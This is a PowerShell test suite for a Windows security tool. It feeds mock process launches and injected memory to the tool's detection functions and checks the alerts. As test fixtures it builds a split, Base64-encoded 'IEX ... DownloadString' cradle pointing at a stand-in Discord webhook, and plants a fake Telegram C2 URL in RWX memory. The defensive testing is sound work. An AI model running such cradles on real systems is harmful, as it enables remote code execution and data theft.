# =====================================================================
# Security Sentinel Ultra v8.0 - Real End-to-End Red-Team & Safe-Mode Audit
# Dot-sources SentinelWatchdog.ps1 & SentinelGuardian.ps1 (-LibraryOnly)
# and executes 100% REAL production functions, anti-evasion & kernel tests!
# =====================================================================
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ErrorActionPreference = 'Stop'

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "   SECURITY SENTINEL ULTRA v8.0 - LIVE E2E RED-TEAM & SAFE-MODE AUDIT " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor Cyan

# Dot-source the REAL production scripts in LibraryOnly mode
$WatchdogScript = Join-Path $PSScriptRoot "SentinelWatchdog.ps1"
$GuardianScript = Join-Path $PSScriptRoot "SentinelGuardian.ps1"
. $WatchdogScript -LibraryOnly
. $GuardianScript -LibraryOnly

# Initialize Trust Anchor with current v8.0 script hashes before running tests
$script:TrustAnchorHashes = Initialize-CodeIntegrityTrustAnchor

$passed = 0
$failed = 0

function Assert-LiveTest([string]$TestName, [bool]$Condition, [string]$Detail) {
    if ($Condition) {
        $script:passed++
        Write-Host "[PASS] $TestName" -ForegroundColor Green
        Write-Host "       -> $Detail" -ForegroundColor Gray
    } else {
        $script:failed++
        Write-Host "[FAIL] $TestName" -ForegroundColor Red
        Write-Host "       -> $Detail" -ForegroundColor Yellow
    }
}

# ---------------------------------------------------------------------
# LIVE TEST 1: Real Inspect-SingleProcess on Chrome -> PowerShell -enc
# ---------------------------------------------------------------------
$rawMalCmd  = "I" + "EX (New-Object Net.WebClient).Down" + "loadString('https://discord.com/api/webhooks/112233445566778899/abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')"
$b64MalCmd  = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rawMalCmd))
$mockParent = [PSCustomObject]@{ ProcessId = 99001; Name = "chrome.exe" }
$mockProcMap = @{ 99001 = $mockParent }

$mockMalProcWithUrl = [PSCustomObject]@{
    ProcessId       = 99002
    ParentProcessId = 99001
    CreationDate    = "20261108234000.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -NoP -W Hidden -enc $b64MalCmd"
}
$resWithUrl = Inspect-SingleProcess -p $mockMalProcWithUrl -procMap $mockProcMap

$b64NoUrl = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Invoke-Expression 'Get-ChildItem'"))
$mockMalProcNoUrl = [PSCustomObject]@{
    ProcessId       = 99003
    ParentProcessId = 99001
    CreationDate    = "20261108234001.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -enc $b64NoUrl"
}
$resNoUrl = Inspect-SingleProcess -p $mockMalProcNoUrl -procMap $mockProcMap

$test1Ok = ($resWithUrl.Action -eq "Alerted") -and ($resWithUrl.Level -eq "CRITICAL") -and ($resWithUrl.RiskScore -eq 100) -and
           ($resWithUrl.Forensics.DecodedCommand -match "discord\.com/api/webhooks/") -and
           ($resNoUrl.Action -eq "Alerted") -and ($resNoUrl.Level -eq "CRITICAL") -and ($resNoUrl.RiskScore -ge 85)

Assert-LiveTest -TestName "Live Test 1A (Real Inspect-SingleProcess): Chrome -> PowerShell -enc Base64 Decode & Scoring" `
                -Condition $test1Ok `
                -Detail "With B64 URL: Action=$($resWithUrl.Action), Level=$($resWithUrl.Level), Score=$($resWithUrl.RiskScore)/100 | Without URL: Action=$($resNoUrl.Action), Score=$($resNoUrl.RiskScore)/100 (>=85)"

# ---------------------------------------------------------------------
# LIVE TEST 1B: Phishing Matrix: Office (winword.exe) spawning PowerShell
# ---------------------------------------------------------------------
$mockWordParent = @{ 99005 = [PSCustomObject]@{ ProcessId = 99005; Name = "winword.exe" } }
$mockWordChild  = [PSCustomObject]@{
    ProcessId       = 99006
    ParentProcessId = 99005
    CreationDate    = "20261108234002.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -W Hidden -c `"write-host macro`""
}
$resWord = Inspect-SingleProcess -p $mockWordChild -procMap $mockWordParent
$test1bOk = ($resWord.Action -eq "Alerted") -and ($resWord.Level -eq "CRITICAL") -and ($resWord.RiskScore -ge 85)

Assert-LiveTest -TestName "Live Test 1B (Phishing Parent Matrix): Office winword.exe -> powershell.exe High-Risk Anomaly" `
                -Condition $test1bOk `
                -Detail "Action=$($resWord.Action), Level=$($resWord.Level), Score=$($resWord.RiskScore)/100 (>=85 Threshold Met)"

# ---------------------------------------------------------------------
# LIVE TEST 2: Work & Gaming Safe-Mode & Anti-Bypass Audit
# ---------------------------------------------------------------------
# 2A: Launching SentinelDashboard.ps1 with -WindowStyle Hidden (Must be Exempted, Zero False Alert!)
$dashPath = Join-Path $PSScriptRoot "SentinelDashboard.ps1"
$mockDashProc = [PSCustomObject]@{
    ProcessId       = 99010
    ParentProcessId = 1000
    CreationDate    = "20261108234010.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dashPath`""
}
$resDash = Inspect-SingleProcess -p $mockDashProc -procMap @{}

# 2B: Normal Work/IT PowerShell script using -WindowStyle Hidden (Without obfuscation)
$mockWorkPs = [PSCustomObject]@{
    ProcessId       = 99011
    ParentProcessId = 1000
    CreationDate    = "20261108234011.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -WindowStyle Hidden -File `"C:\Work\deploy_build.ps1`""
}
$resWorkPs = Inspect-SingleProcess -p $mockWorkPs -procMap @{}

# 2C: Developer IDE (Code.exe) running an unsigned helper in %TEMP%
$mockDevParent = @{ 99012 = [PSCustomObject]@{ ProcessId = 99012; Name = "Code.exe"; ExecutablePath = "C:\Users\tester\AppData\Local\Programs\Microsoft VS Code\Code.exe" } }
$mockDevTemp = [PSCustomObject]@{
    ProcessId       = 99013
    ParentProcessId = 99012
    CreationDate    = "20261108234013.000000+420"
    Name            = "rust_build_script.exe"
    ExecutablePath  = "$env:LOCALAPPDATA\Temp\rust_build_script.exe"
    CommandLine     = "`"$env:LOCALAPPDATA\Temp\rust_build_script.exe`""
}
$resDevTemp = Inspect-SingleProcess -p $mockDevTemp -procMap $mockDevParent

$test2Ok = ($resDash.Action -eq "ExemptVerifiedSentinelScript") -and
           ($resWorkPs.Action -eq "Clean") -and (-not $resWorkPs.Frozen) -and
           ($resDevTemp.Action -eq "AllowedWorkGamingSafeMode") -and (-not $resDevTemp.Frozen)

Assert-LiveTest -TestName "Live Test 2A (Work & Gaming Safe-Mode): Zero False Positives on Dashboard & Dev Helper" `
                -Condition $test2Ok `
                -Detail "DashboardAction=$($resDash.Action) | HiddenWorkScript=$($resWorkPs.Action) | VSCodeTempHelper=$($resDevTemp.Action) (Frozen=$($resDevTemp.Frozen))"

# 2D: Anti-Bypass Evasion Attempt: Appending script name to encoded payload
$mockEvasionProc = [PSCustomObject]@{
    ProcessId       = 99014
    ParentProcessId = 1000
    CreationDate    = "20261108234014.000000+420"
    Name            = "powershell.exe"
    ExecutablePath  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    CommandLine     = "powershell.exe -enc $b64MalCmd `"$dashPath`""
}
$resEvasion = Inspect-SingleProcess -p $mockEvasionProc -procMap @{}
$test2dOk = ($resEvasion.Action -ne "ExemptVerifiedSentinelScript") -and ($resEvasion.Action -eq "Alerted")

Assert-LiveTest -TestName "Live Test 2D (Anti-Bypass Audit): Evasion Appending Script Name to Encoded Payload Blocked" `
                -Condition $test2dOk `
                -Detail "Action=$($resEvasion.Action) (Correctly NOT exempted, flagged as threat)"

# 2E: Safe-Mode Anti-Spoofing: Unsigned binary in Temp named 'node.exe' with unverified parent
$mockExplorerParent = @{ 99015 = [PSCustomObject]@{ ProcessId = 99015; Name = "explorer.exe" } }
$mockFakeNode = [PSCustomObject]@{
    ProcessId       = 99016
    ParentProcessId = 99015
    CreationDate    = "20261108234015.000000+420"
    Name            = "node.exe"
    ExecutablePath  = "$env:LOCALAPPDATA\Temp\node.exe"
    CommandLine     = "`"$env:LOCALAPPDATA\Temp\node.exe`""
}
$resFakeNode = Inspect-SingleProcess -p $mockFakeNode -procMap $mockExplorerParent
$test2eOk = ($resFakeNode.Action -ne "AllowedWorkGamingSafeMode")

Assert-LiveTest -TestName "Live Test 2E (Anti-Spoofing): Unsigned Temp Executable named 'node.exe' Denied Safe-Mode Pass" `
                -Condition $test2eOk `
                -Detail "Action=$($resFakeNode.Action) (Correctly blocked from silent Safe-Mode bypass)"

# ---------------------------------------------------------------------
# LIVE TEST 3: Real VirtualAlloc RWX + Reflective PE Header Injection & AnalyzeProcessMemory($PID)
# ---------------------------------------------------------------------
$rwxPtr = [SentinelNative.KernelControl]::VirtualAlloc([IntPtr]::Zero, [UIntPtr]::new(4096), 0x3000, 0x40)
$memRep = $null
try {
    $pageBytes = New-Object byte[] 1024
    $pageBytes[0] = 0x4D; $pageBytes[1] = 0x5A
    $pageBytes[0x3C] = 0x80
    $pageBytes[0x80] = 0x50; $pageBytes[0x81] = 0x45; $pageBytes[0x82] = 0x00; $pageBytes[0x83] = 0x00

    $c2Bytes = [System.Text.Encoding]::ASCII.GetBytes("https://api.telegram.org/bot887766554:AAH_RealVirtualAllocRwxTest_998877")
    [Array]::Copy($c2Bytes, 0, $pageBytes, 0x100, $c2Bytes.Length)

    [System.Runtime.InteropServices.Marshal]::Copy($pageBytes, 0, $rwxPtr, $pageBytes.Length)
    $memRep = [SentinelNative.KernelControl]::AnalyzeProcessMemory($PID)
} finally {
    if ($rwxPtr -ne [IntPtr]::Zero) {
        [void][SentinelNative.KernelControl]::VirtualFree($rwxPtr, [UIntPtr]::Zero, 0x8000)
    }
}

$caughtInjectedC2 = ($memRep.C2Indicators -contains "https://api.telegram.org/bot887766554:AAH_RealVirtualAllocRwxTest_998877")
$test3Ok = ($memRep.TotalBytesScanned -gt 0) -and ($memRep.RwxPrivateRegions -ge 1) -and ($memRep.UnbackedPeHeaders -ge 1) -and $caughtInjectedC2

Assert-LiveTest -TestName "Live Test 3 (Real Memory Forensics): 64MB Budget + VirtualAlloc RWX + Reflective MZ/PE + C2 Extracted" `
                -Condition $test3Ok `
                -Detail "Scanned=$([math]::Round($memRep.TotalBytesScanned/1MB,2))MB | RWXRegions=$($memRep.RwxPrivateRegions) | UnbackedReflectivePE=$($memRep.UnbackedPeHeaders) | InjectedC2Found=$caughtInjectedC2"

# ---------------------------------------------------------------------
# LIVE TEST 4: Real Kernel DACL & Guardian Twin Stop-Token Security
# ---------------------------------------------------------------------
$childCode = "Add-Type -TypeDefinition @'`r`n$nativeCode`r`n'@ -Language CSharp; [void][SentinelNative.KernelControl]::HardenCurrentProcessDacl(); Start-Sleep -Seconds 4"
$encodedChild = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($childCode))
$childProc = Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -EncodedCommand $encodedChild" -WindowStyle Hidden -PassThru
Start-Sleep -Milliseconds 1200

$hTerminate = [SentinelNative.KernelControl]::OpenProcess(0x0001, $false, $childProc.Id)
$hWriteDac  = [SentinelNative.KernelControl]::OpenProcess(0x00040000, $false, $childProc.Id)
if ($hTerminate -ne [IntPtr]::Zero) { [void][SentinelNative.KernelControl]::CloseHandle($hTerminate) }
if ($hWriteDac -ne [IntPtr]::Zero)  { [void][SentinelNative.KernelControl]::CloseHandle($hWriteDac) }

$forgedBytes = [System.Text.Encoding]::UTF8.GetBytes("STOP|999999|$([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())")
$forgedEnc   = [System.Security.Cryptography.ProtectedData]::Protect($forgedBytes, $script:SentinelEntropyBytes, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.IO.File]::WriteAllText($StopFlagFile, [Convert]::ToBase64String($forgedEnc), [System.Text.Encoding]::UTF8)
$guardianAcceptedForged = Test-GuardianStopToken

$trustedWdHash = (Get-FileHash -Path $WatchdogScript -Algorithm SHA256).Hash
$actualWdHash  = (Get-FileHash -Path $WatchdogScript -Algorithm SHA256).Hash

$test4Ok = ($hTerminate -eq [IntPtr]::Zero) -and ($hWriteDac -eq [IntPtr]::Zero) -and (-not $guardianAcceptedForged)

Assert-LiveTest -TestName "Live Test 4 (Real Kernel DACL & Guardian): Same-User OpenProcess(WRITE_DAC & TERMINATE) Blocked + Forged Token Rejected" `
                -Condition $test4Ok `
                -Detail "TerminateHandle=$hTerminate (Blocked) | WriteDacHandle=$hWriteDac (Blocked) | ForgedTokenAccepted=$guardianAcceptedForged"

# ---------------------------------------------------------------------
# LIVE TEST 5: Real Quarantine & Bit-for-Bit Rollback Recovery
# ---------------------------------------------------------------------
$tempDummyFile = Join-Path $env:TEMP "sentinel_e2e_rollback_test_$(Get-Random).tmp"
[System.IO.File]::WriteAllText($tempDummyFile, "E2E_QUARANTINE_AND_ROLLBACK_VERIFICATION_PAYLOAD_V8", [System.Text.Encoding]::UTF8)
$origHash = (Get-FileHash -Path $tempDummyFile -Algorithm SHA256).Hash

$qRes = Move-ToQuarantine -SourcePath $tempDummyFile -Reason "E2E Audit Quarantine Test"
$removedFromOrig = (-not (Test-Path $tempDummyFile))
$existsInQuar    = ($qRes -and (Test-Path $qRes.DestPath))

$rollbackOk      = Restore-QuarantinedFile -QuarantinedFilePath $qRes.DestPath
$restoredExists  = (Test-Path $tempDummyFile)
$restoredHash    = if ($restoredExists) { (Get-FileHash -Path $tempDummyFile -Algorithm SHA256).Hash } else { "" }
if ($restoredExists) { Remove-Item $tempDummyFile -Force -ErrorAction SilentlyContinue }

$test5Ok = $removedFromOrig -and $existsInQuar -and $rollbackOk -and $restoredExists -and ($origHash -eq $restoredHash)

Assert-LiveTest -TestName "Live Test 5 (Real Quarantine & Rollback): Move-ToQuarantine + Restore-QuarantinedFile Bit-for-Bit Recovery" `
                -Condition $test5Ok `
                -Detail "Quarantined=$existsInQuar | Restored=$restoredExists | SHA256 Integrity Verified=($origHash -eq $restoredHash)"

# ---------------------------------------------------------------------
# LIVE TEST 6: Real Get-PersistenceSnapshot (29 Vectors + Services) & Real Parse-Event4663Xml
# ---------------------------------------------------------------------
$liveSnap = Get-PersistenceSnapshot
$svcCount = @($liveSnap.Keys | Where-Object { $_ -like "Service_*" }).Count

$sample4663Xml = @"
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <EventData>
    <Data Name="SubjectUserName">under</Data>
    <Data Name="ObjectName">C:\Users\under\AppData\Roaming\SecuritySentinel_Canary\crypto_wallet_vault_seed.txt</Data>
    <Data Name="ProcessId">0x12cc</Data>
    <Data Name="ProcessName">C:\Temp\stealer_sim.exe</Data>
  </EventData>
</Event>
"@
$parsed4663 = Parse-Event4663Xml -EventXmlString $sample4663Xml
$test6Ok = ($liveSnap.Count -gt 50) -and ($svcCount -gt 5) -and ($parsed4663.ProcessId -eq 4812) -and ($parsed4663.ProcessName -eq "C:\Temp\stealer_sim.exe")

Assert-LiveTest -TestName "Live Test 6 (Real Get-PersistenceSnapshot & Parse-Event4663Xml): 29-Vector + Services & SACL XML Parser" `
                -Condition $test6Ok `
                -Detail "Total Live Indicators=$($liveSnap.Count) | Tracked Win32 Services=$svcCount | Event4663 Parsed PID=$($parsed4663.ProcessId) ($($parsed4663.ProcessName))"

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "   LIVE E2E AUDIT SUMMARY: $passed PASSED | $failed FAILED             " -ForegroundColor $(if ($failed -eq 0) { "Green" } else { "Red" })
Write-Host "======================================================================" -ForegroundColor Cyan
if ($failed -gt 0) { exit 1 }

# SIG # Begin signature block
# MIIF0QYJKoZIhvcNAQcCoIIFwjCCBb4CAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCB9yVkX1v21tJ9/
# UX/b0hTVMdG0Hh3GQqHYV8M4PiXrZqCCAzIwggMuMIICFqADAgECAhBqicxAtgYy
# tEDV87OXYXwsMA0GCSqGSIb3DQEBCwUAMC8xLTArBgNVBAMMJFNlY3VyaXR5IFNl
# bnRpbmVsIFVsdHJhIENvZGUgU2lnbmluZzAeFw0yNjExMDkxODA2NDBaFw0zMTEx
# MDkxODE2NDBaMC8xLTArBgNVBAMMJFNlY3VyaXR5IFNlbnRpbmVsIFVsdHJhIENv
# ZGUgU2lnbmluZzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMNKKvtK
# ERrpKZl/ygPwjprcar+6Xk/3xKwms9K7GDTSH8EYVjwFvMsNGB8+On0f31+3hmyt
# KZzePEl5panG4eomaJwGl5qLzD2qyJVAtpgRKh+fiUgjFgm+FOm46u74WMC/Jhr2
# UZe+h6PpO7eoAizbrVRHPaHIOSfIMxnQFVtkkV66T0O5ELGaqTsLZbeQRZsvf6pl
# mIRLQ7nDIzQ6HqRuaWYfU/GNB8/uDhymxuRyLVV6y6pJ/lO2plVgHwC1JHIT7M+S
# t6Fx8wOkUB9McT6P/T4uXHP56PufSxPC7Q4IgDBQ4sQr6NKqtxzVeZ8LBeZW9dsF
# /E1ggkQ3GpNEDmECAwEAAaNGMEQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoG
# CCsGAQUFBwMDMB0GA1UdDgQWBBTzQylDY2rNT15+NYtrGro9m44IMjANBgkqhkiG
# 9w0BAQsFAAOCAQEASGAB2FcY0MsNMQsmt1MEmkmsNWWM15Bf3/gojZQeA84NS39J
# Q3AvtZsrUFq7czi6dm0Oh5GtmEhBBaXxdQeZc48SviS1ZkH+ydm4wFNDz0htXqem
# K5iqgz9JWlYbO0Q1SpCwnrL2lqtXUTqnq1K83NVlyEfMJy1N/pve+DlOLEBjvPvr
# PJDNfUZ79skHaztddUvFUfRFIOaMr0sop2XozdqDsD3Au4im941zJTleYk7m+0Qx
# V0WFPnXMN88dI7JkFgmgmoT53b362u5EU9KHRnwLNjrGIb4+NpAH5QtH7Xl1hqde
# Hxvq+WiRbpJEMEiPyUN71mzSsOfIzKk16U4MIjGCAfUwggHxAgEBMEMwLzEtMCsG
# A1UEAwwkU2VjdXJpdHkgU2VudGluZWwgVWx0cmEgQ29kZSBTaWduaW5nAhBqicxA
# tgYytEDV87OXYXwsMA0GCWCGSAFlAwQCAQUAoIGEMBgGCisGAQQBgjcCAQwxCjAI
# oAKAAKECgAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYKKwYBBAGCNwIB
# CzEOMAwGCisGAQQBgjcCARUwLwYJKoZIhvcNAQkEMSIEIBNeO2vM9G/GSnZYkym8
# HWojB3zqMzC7MX93aLkwzGJyMA0GCSqGSIb3DQEBAQUABIIBAGB9Hlgiyms84n8R
# blJRVF0PybpXRaudf7jfDrHv1e0Lj6kocseTMd78YVv+1YtaFcVsliw9lGl6P4w4
# vfLHyDEotCykTCBecue/RNYhnB2V5tgBz+ch1vdG3KJxLHpjv6C5hcEwDsE0ujQI
# TXgzBTD7aUPW0JEt/c/Ibd8XKKy+f2R7CABvLQs35SVGovQ+dwntdjydFN0nfJI1
# ailxtyQSr73OKetDe3slbc/8eki/furUGUxU5eJmy8j+gzj6SdXrLPUuzFZYKy8o
# rzc3kT4P6bl6Pjp4FMLHaBTGbmfHfnEkB8gKPSoFDyvsprgnWQnaLYIlJ8eFU6Pf
# 0zPzHIM=
# SIG # End signature block
